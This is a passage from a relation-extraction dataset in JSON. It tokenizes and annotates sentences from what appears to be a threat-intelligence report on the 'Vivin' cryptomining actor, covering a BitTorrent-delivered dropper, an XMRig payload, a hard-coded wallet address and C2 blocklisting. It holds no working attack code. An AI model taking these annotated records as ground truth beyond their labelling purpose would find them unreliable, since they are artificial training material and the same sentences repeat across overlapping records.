[{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "process-hollowing", "pos": [17, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "dropper", "pos": [14, 15], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [100, 100], "name": "BitTorrent", "pos": [23, 24], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "actor", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [107, 107], "name": "wallet addresses", "pos": [5, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "XMRig payload", "pos": [15, 17], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [146, 146], "name": "address", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [171, 171], "name": "wallet address", "pos": [29, 31], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "Vivin", "pos": [33, 34], "index": "11_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3], "t": 0, "h": 5}, {"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 5}, {"r": "WR", "evidence": [1, 2, 3], "t": 3, "h": 5}, {"r": "WR", "evidence": [3], "t": 4, "h": 5}]}, {"title": "647-37", "sents": [["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."], ["The", "first", ",", "``", "45VgqBWVhgu5LHSafj4q5sB3wuYXGvrSs5N9KL", ",", "''", "we", "found", "hard-coded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "."], ["This", "time", ",", "the", "address", "is", "being", "observed", "on", "the", "``", "minexmr", "''", "mining", "pool", ",", "illustrated", "in", "the", "figure", "below", ",", "the", "same", "pool", "as", "our", "first", "active", "wallet", "address", "linked", "to", "Vivin", "."], ["At", "the", "time", "of", "writing", ",", "Talos", "has", "not", "yet", "observed", "any", "specific", "samples", "in", "our", "telemetry", "directly", "tied", "to", "the", "second", "wallet", "address", ";", "however", ",", "data", "from", "VirusTotal", "does", "link", "it", "to", "a", "cryptominer", "submitted", "back", "in", "December", "2017", "."], ["URIs", "used", "by", "Vivin", "'s", "malware", "can", "be", "blocklisted", "and", "blocked", "at", "the", "network", "level", ",", "such", "as", "the", "image", "host", "links", "used", "to", "download", "and", "deploy", "the", "malware", "'s", "intermediate", "stages", ",", "IP", "addresses", "associated", "with", "command", "and", "control", "infrastructure", ",", "and", "the", "domains", "used", "to", "connect", "to", "the", "mining", "pools", "themselves", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [12, 12], "name": "file crypters", "pos": [12, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "rootkits", "pos": [15, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "process-hollowing", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "dropper", "pos": [14, 15], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [74, 74], "name": "BitTorrent", "pos": [23, 24], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "actor", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [81, 81], "name": "wallet addresses", "pos": [5, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [113, 113], "name": "XMRig payload", "pos": [15, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [120, 120], "name": "address", "pos": [4, 5], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [145, 145], "name": "wallet address", "pos": [29, 31], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "Vivin", "pos": [33, 34], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "URIs", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [196, 196], "name": "Vivin 's malware", "pos": [3, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [212, 212], "name": "image", "pos": [19, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "malware", "pos": [28, 29], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [0, 1, 2], "t": 2, "h": 4}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}]}, {"title": "647-38", "sents": [["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."], ["The", "first", ",", "``", "45VgqBWVhgu5LHSafj4q5sB3wuYXGvrSs5N9KL", ",", "''", "we", "found", "hard-coded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "."], ["This", "time", ",", "the", "address", "is", "being", "observed", "on", "the", "``", "minexmr", "''", "mining", "pool", ",", "illustrated", "in", "the", "figure", "below", ",", "the", "same", "pool", "as", "our", "first", "active", "wallet", "address", "linked", "to", "Vivin", "."], ["At", "the", "time", "of", "writing", ",", "Talos", "has", "not", "yet", "observed", "any", "specific", "samples", "in", "our", "telemetry", "directly", "tied", "to", "the", "second", "wallet", "address", ";", "however", ",", "data", "from", "VirusTotal", "does", "link", "it", "to", "a", "cryptominer", "submitted", "back", "in", "December", "2017", "."], ["URIs", "used", "by", "Vivin", "'s", "malware", "can", "be", "blocklisted", "and", "blocked", "at", "the", "network", "level", ",", "such", "as", "the", "image", "host", "links", "used", "to", "download", "and", "deploy", "the", "malware", "'s", "intermediate", "stages", ",", "IP", "addresses", "associated", "with", "command", "and", "control", "infrastructure", ",", "and", "the", "domains", "used", "to", "connect", "to", "the", "mining", "pools", "themselves", "."], ["Aside", "from", "siphoning", "resources", "from", "organizations", ",", "the", "malware", "used", "to", "drop", "XMRig", "could", "also", "be", "modified", "for", "data", "theft", ",", "credential", "harvesting", ",", "and", "other", "malicious", "activity", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "dropper", "pos": [14, 15], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [44, 44], "name": "BitTorrent", "pos": [23, 24], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "actor", "pos": [1, 2], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "wallet addresses", "pos": [5, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "XMRig payload", "pos": [15, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [90, 90], "name": "address", "pos": [4, 5], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [115, 115], "name": "wallet address", "pos": [29, 31], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "Vivin", "pos": [33, 34], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "URIs", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [166, 166], "name": "Vivin 's malware", "pos": [3, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "image", "pos": [19, 20], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "malware", "pos": [28, 29], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [225, 225], "name": "malware", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [229, 229], "name": "XMRig", "pos": [12, 13], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 0, "h": 1}]}]